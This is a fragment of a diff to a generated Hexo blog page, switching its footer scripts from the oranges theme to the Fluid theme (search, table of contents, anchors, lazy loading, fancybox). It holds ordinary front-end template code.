-                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
-                }
-                str += "</li>";
-              }
-            });
-            str += "</ul>";
-            if (str.indexOf('<li>') === -1) {
-              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
-            }
-            $resultContent.innerHTML = str;
-          });
-        },
-        error: function(xhr, status, error) {
-          $resultContent.innerHTML = ""
-          if (xhr.status === 404) {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
-          } else {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
-          }
-        }
-      });
-      $(document).on('click', '#search-close-icon', function() {
-        $('#search-input').val('');
-        $('#search-result').html('');
-      });
-    }
-
-    var getSearchFile = function() {
-        var path = "/search.xml";
-        searchFunc(path, 'search-input', 'search-result');
-    }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
   </script>
 
 
 
 
-        
-  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
-    <a href="javascript: void(0)">
-      <i id="theme-icon" class="iconfont icon-moon"></i>
-    </a>
-  </div>
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
 
   
-<script src="/js/colorscheme.js"></script>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
 
 
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
 
 
-
-        
   
-    <div class="share-icon tools-bar-item">
-      <a href="javascript: void(0)" id="share-icon">
-        <i class="iconfont iconshare"></i>
-      </a>
-      <div class="share-content hidden">
-        
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F11%2F12%2F%25E4%25BD%25BF%25E7%2594%25A8%25E5%2586%2585%25E6%25A0%25B8%25E5%259B%259E%25E8%25B0%2583%25E8%25A1%25A8%25E8%25BF%259B%25E7%25A8%258B%25E6%25B3%25A8%25E5%2585%25A5%2F + '" target="_blank" title="Twitter">
-            <i class="iconfont icon-twitter"></i>
-          </a>
-        
-        
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" target="_blank" title="Facebook">
-            <i class="iconfont icon-facebooksquare"></i>
-          </a>
-        
-      </div>
-    </div>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
   
-  
-<script src="/js/shares.js"></script>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
-      </div>
-    </div>
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
   
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+
         <style>
             [bg-lazy] {
                 background-image: none !important;
